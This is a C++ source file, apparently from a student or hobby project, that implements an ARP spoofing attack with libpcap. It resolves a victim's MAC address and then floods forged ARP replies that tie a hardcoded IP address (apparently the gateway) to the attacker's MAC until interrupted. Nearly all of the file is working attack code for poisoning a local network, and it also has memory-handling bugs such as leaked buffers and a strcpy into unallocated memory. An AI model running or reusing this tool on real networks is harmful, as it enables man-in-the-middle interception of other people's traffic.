#include "arp_spoofing.h"
#include <unistd.h>
#include <signal.h>

bool loop = true;

void sig_handler(int signo){
    loop = false;
    printf("Turn off arpspoofing\n");
}

void arp_spoofing::ExecuteArpSpoofing(){
    signal(SIGINT, sig_handler);
    Address* Mac = new Address(getinfo::get_my_mac_address(Dev),getinfo::get_my_ipv4_address());
    MakeRequestPacket(Mac);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(Dev, BUFSIZ, 1, 1000, errbuf);

    while(true){
        pcap_sendpacket(handle, RequestPacket->ToPacket60(), 60);
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) return;

        if (arpcd::IsReplyPacket(packet, Mac->GetMacAddress())){
            ReplyPacket = new arp_packet(packet);
            printf("Catch REPLY\n");
            break;
        }
    }

    MakeAttackPacket();
    while(loop){
        pcap_sendpacket(handle, AttackPacket->ToPacket60(), 60);
    }

    pcap_close(handle);
}

void arp_spoofing::MakeAttackPacket(){
    u_char protocol[2] = {0x08, 0x06};

    ethernet_header* etherh = new ethernet_header(ReplyPacket->GetEthernet()->GetSoruce(),
                                                  RequestPacket->GetEthernet()->GetSoruce(),
                                                  protocol);

    u_char hardType[2] = {0x00, 0x01};
    u_char protType[2] = {0x08, 0x00};
    u_char opcode[2] = {0x00, 0x02};

    Hardware* hard = new Hardware(hardType, 0x06);
    Protocol* prot = new Protocol(protType, 0x04);

    Address* send = new Address(RequestPacket->GetEthernet()->GetSoruce(), conv::ipv4_to_hex("172.20.10.2"));
    Address* trag = new Address(ReplyPacket->GetEthernet()->GetSoruce(), SenderIp);

    arp_header* arph = new arp_header(hard, prot, opcode, send, trag);
    AttackPacket = new arp_packet(etherh, arph);
}

void arp_spoofing::MakeRequestPacket(Address* attacker){
    u_char protocol[2] = {0x08, 0x06};

    ethernet_header* etherh = new ethernet_header(conv::mac_to_hex("ff:ff:ff:ff:ff:ff"),
                                                  attacker->GetMacAddress(),
                                                  protocol);

    u_char hardType[2] = {0x00, 0x01};
    u_char protType[2] = {0x08, 0x00};
    u_char opcode[2] = {0x00, 0x01};

    Hardware* hard = new Hardware(hardType, 0x06);
    Protocol* prot = new Protocol(protType, 0x04);
    Address* send = new Address(attacker->GetMacAddress(), attacker->GetIpAddress());
    Address* trag = new Address(conv::mac_to_hex("00:00:00:00:00:00"), SenderIp);

    arp_header* arph = new arp_header(hard, prot, opcode, send, trag);

    RequestPacket = new arp_packet(etherh, arph);
}

arp_spoofing::arp_spoofing(){
    SenderIp = new u_char[IP_SIZE];
    TargetIp = new u_char[IP_SIZE];
    RequestPacket = new arp_packet();
    ReplyPacket = new arp_packet();
    AttackPacket = new arp_packet();
}
arp_spoofing::~arp_spoofing(){
    delete[] SenderIp;
    delete[] TargetIp;
    delete Dev;
    delete RequestPacket;
    delete ReplyPacket;
    delete AttackPacket;
}
arp_spoofing::arp_spoofing(const char* dev, const char* sender, char* target){
    SenderIp = new u_char[IP_SIZE];
    TargetIp = new u_char[IP_SIZE];
    Dev = new char[strlen(dev) + 1];
    strcpy(Dev, dev);
    RequestPacket = new arp_packet();
    ReplyPacket = new arp_packet();
    AttackPacket = new arp_packet();

    SenderIp = conv::ipv4_to_hex(sender);
    TargetIp = conv::ipv4_to_hex(target);
}
arp_spoofing::arp_spoofing(const char* dev, u_char* sender, u_char* target,
                           struct arp_packet* request, struct arp_packet* reply, struct arp_packet* attack){
    SenderIp = new u_char[IP_SIZE];
    TargetIp = new u_char[IP_SIZE];
    strcpy(Dev, dev);
    memcpy(SenderIp, sender, IP_SIZE);
    memcpy(TargetIp, target, IP_SIZE);
    RequestPacket = new arp_packet(request->GetEthernet(), request->GetArp());
    ReplyPacket = new arp_packet(reply->GetEthernet(), reply->GetArp());
    AttackPacket = new arp_packet(attack->GetEthernet(), attack->GetArp());
}
u_char* arp_spoofing::GetSenderIp(){
    return SenderIp;
}
u_char* arp_spoofing::GetTargetIp(){
    return TargetIp;
}
arp_packet* arp_spoofing::GetRequestPacket(){
    return RequestPacket;
}
arp_packet* arp_spoofing::GetReplyPacket(){
    return ReplyPacket;
}
arp_packet* arp_spoofing::GetAttackPacket(){
    return AttackPacket;
}
